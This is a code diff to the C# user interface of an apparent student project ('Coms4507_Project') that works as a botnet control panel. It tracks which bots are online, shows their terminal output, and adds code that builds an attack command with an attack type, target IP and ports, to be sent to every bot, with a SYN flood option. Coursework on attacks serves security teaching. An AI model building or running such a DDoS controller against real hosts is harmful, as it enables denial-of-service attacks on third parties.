@@ -82,47 +82,65 @@ namespace Coms4507_Project
             {
                 while(true)
                 {
-                    Thread.Sleep(250);
-                    Trace.WriteLine("UPDATING BOT FOR THE UI");
-
-                    
-
-                    // Go through and invoke the dispatcher for update on the colours.
-                    foreach (string botName in botHandler.botIpPortDetails.Keys)
+                    try
                     {
-                        if (!listOfAllBots.Contains(botName))
-                        {
-                            listOfAllBots.Add(botName);
-                        }
-                        Trace.WriteLine(botName);
+                        Thread.Sleep(250);
+                        Trace.WriteLine("UPDATING BOT FOR THE UI");
 
+                        // Prints the terminal output from the bots to the commandline
                         Dispatcher.Invoke(() =>
                         {
-                            Label result = FindName($"{botName}_STATUS") as Label;
-                            result.Content = "ONLINE";
-                            result.Foreground = new SolidColorBrush(Colors.LawnGreen);
+                            string terminalText = "";
+                            foreach (string output in botHandler.outputList.ToArray())
+                            {
+                                terminalText += output + Environment.NewLine;
+                            }
+                            TERMINAL_OUTPUT_BOTS.Text = terminalText;
                         });
-                    }
 
-                    // Go a
-                    foreach (string botName in listOfAllBots)
-                    {
-                        if (!botHandler.botIpPortDetails.ContainsKey(botName))
+                        // Go through and invoke the dispatcher for update on the colours.
+                        foreach (string botName in botHandler.botIpPortDetails.Keys)
                         {
+                            if (!listOfAllBots.Contains(botName))
+                            {
+                                listOfAllBots.Add(botName);
+                            }
+                            Trace.WriteLine(botName);
+
                             Dispatcher.Invoke(() =>
                             {
                                 Label result = FindName($"{botName}_STATUS") as Label;
-                                result.Content = "OFFLINE";
-                                result.Foreground = new SolidColorBrush(Colors.Red);
+                                result.Content = "ONLINE";
+                                result.Foreground = new SolidColorBrush(Colors.LawnGreen);
                             });
                         }
-                    }
 
-                    
+                        // Go and see if there's offline bots to account for.
+                        foreach (string botName in listOfAllBots.ToArray())
+                        {
+                            if (!botHandler.botIpPortDetails.ContainsKey(botName))
+                            {
+                                Dispatcher.Invoke(() =>
+                                {
+                                    Label result = FindName($"{botName}_STATUS") as Label;
+                                    result.Content = "OFFLINE";
+                                    result.Foreground = new SolidColorBrush(Colors.Red);
+                                });
+                            }
+                        }
+                    } catch(Exception e)
+                    {
+                        Trace.WriteLine("IGNORING: " + e.Message);
+                    }
                 }
             };
             Task task = new Task(updateBots, "updateBots");
             task.Start();
+        }
+
+        private string FormatPorts(string portNumbers)
+        {
+            return "[" + portNumbers.Trim() + "]";
         }
 
         private void SYN_FLOOD_Click(object sender, System.Windows.RoutedEventArgs e)
@@ -198,6 +216,19 @@ namespace Coms4507_Project
 
             ATTACK_BUTTON.Background = new SolidColorBrush(Colors.Gray);
             ATTACK_BUTTON.Content = "STARTING ATTACK";
+
+            // Format the attack, and then mass distribute it out to all active bots.
+
+            string targetIp = IP_ADDRESS.Text;
+            string ports = PORTS.Text;
+            string runtime = "*"; // Deprecated: hardcoded because we don't support runtimes anymore but the APIs use it.
+
+            Dictionary<string, string> attackMessage = new Dictionary<string, string>();
+            attackMessage.Add("request", "attack");
+            attackMessage.Add("attack", attackType);
+            attackMessage.Add("targetIP", targetIp);
+            attackMessage.Add("ports", "[" + ports.Trim() + "]");
+            attackMessage.Add("runtime", runtime);
 
             Thread.Sleep(1000);
             ATTACK_BUTTON.Background = new SolidColorBrush(Colors.LawnGreen);
